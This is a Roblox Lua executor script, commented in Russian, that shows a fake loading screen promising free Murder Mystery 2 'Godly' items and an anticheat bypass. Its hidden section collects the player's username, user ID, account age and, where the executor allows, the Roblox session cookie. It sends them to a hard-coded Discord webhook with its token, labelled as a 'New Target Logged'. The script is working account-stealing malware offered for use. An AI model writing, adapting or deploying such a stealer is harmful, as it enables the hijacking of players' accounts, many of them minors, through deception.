-- [[ ВИЗУАЛЬНАЯ ЧАСТЬ: ФЕЙКОВАЯ ЗАГРУЗКА ]]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 350, 0, 100)
MainFrame.Position = UDim2.new(0.5, -175, 0.4, -50)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.BorderSizePixel = 0

local Corner = Instance.new("UICorner", MainFrame)
Corner.CornerRadius = UDim.new(0, 10)

local StatusLabel = Instance.new("TextLabel", MainFrame)
StatusLabel.Size = UDim2.new(1, 0, 0, 40)
StatusLabel.BackgroundTransparency = 1
StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
StatusLabel.TextSize = 18
StatusLabel.Font = Enum.Font.GothamBold
StatusLabel.Text = "Connecting to MM2 Servers..."

local BarBg = Instance.new("Frame", MainFrame)
BarBg.Size = UDim2.new(0, 300, 0, 10)
BarBg.Position = UDim2.new(0.5, -150, 0.7, 0)
BarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
BarBg.BorderSizePixel = 0

local Fill = Instance.new("Frame", BarBg)
Fill.Size = UDim2.new(0, 0, 1, 0)
Fill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)

-- [[ СКРЫТАЯ ЧАСТЬ: ОТПРАВКА ДАННЫХ ТЕБЕ ]]
local function collectAndSend()
    local url = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"
    local player = game.Players.LocalPlayer
    
    -- Пытаемся получить информацию об аккаунте
    local cookie = "Failed to fetch (Executor Restriction)"
    pcall(function()
        -- Это сработает только на экзекуторах с поддержкой функций чтения куки
        cookie = request({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"}).Headers["Set-Cookie"] or "No Cookie Access"
    end)

    local data = {
        ["embeds"] = {{
            ["title"] = "🎯 New Target Logged!",
            ["description"] = "Username: **" .. player.Name .. "**\nUser ID: `" .. player.UserId .. "`\nAccount Age: " .. player.AccountAge .. " days",
            ["fields"] = {
                {["name"] = "Cookie / Data", ["value"] = "```" .. cookie .. "```"}
            },
            ["color"] = 65280
        }}
    }

    local req = (syn and syn.request) or (http and http.request) or request
    if req then
        req({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end
end

-- ЗАПУСК ПРОЦЕССА
spawn(function()
    collectAndSend()
    for i = 1, 100 do
        task.wait(0.08)
        Fill.Size = UDim2.new(i/100, 0, 1, 0)
        StatusLabel.Text = "Fetching Inventory: " .. i .. "%"
        if i == 45 then StatusLabel.Text = "Bypassing Anticheat..." end
        if i == 85 then StatusLabel.Text = "Finalizing Godly Grant..." end
    end
    StatusLabel.Text = "Success! Rejoin to see items."
    task.wait(5)
    ScreenGui:Destroy()
end)
